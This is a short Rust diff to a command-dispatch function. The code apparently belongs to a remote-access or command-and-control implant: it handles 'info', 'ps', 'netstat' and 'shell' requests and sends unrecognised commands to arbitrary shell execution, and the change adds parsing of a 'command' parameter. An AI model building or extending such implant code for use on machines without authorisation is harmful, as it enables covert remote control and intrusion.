@@ -54,8 +54,15 @@ fn dispatch(command: &str, parameters: &str) -> String {
         "info" => collect_system_info(),
         "ps" => list_processes(),
         "netstat" => list_network_connections(),
-        "shell" => shell_exec(parameters),
-        _ => shell_exec(&format!("{} {}", command, parameters)),
+        "shell" => {
+            let cmd = link_common::extract_param(parameters, "command");
+            shell_exec(if cmd.is_empty() { parameters } else { &cmd })
+        }
+        _ => {
+            let cmd = link_common::extract_param(parameters, "command");
+            let fallback = format!("{} {}", command, parameters);
+            shell_exec(if cmd.is_empty() { &fallback } else { &cmd })
+        }
     }
 }
 
